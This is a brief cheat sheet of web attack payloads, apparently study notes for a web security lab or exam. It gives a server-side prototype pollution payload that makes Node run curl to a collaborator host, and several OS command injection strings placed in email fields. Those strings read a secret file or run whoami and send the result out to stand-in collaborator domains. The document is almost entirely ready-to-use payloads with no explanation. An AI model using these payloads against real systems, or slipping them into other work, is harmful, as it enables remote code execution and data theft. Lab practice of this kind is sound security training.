# Code Execution  

>Remote code execution via server-side prototype pollution  

```
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
    ]
}
```  

>XML and OS Command execution  

```
<email>user16@exploit-server.net||$(curl $(cat /home/carlos/secret).COLLABORATOR.com)||</email>
```  

>BASH os command execution  
  
```bash
email=carlos@exam.net||curl+`whoami`.COLLABORATOR.net||
```  

```
||$(curl $(cat /home/carlos/secret).COLLABORATOR.com)||
```  
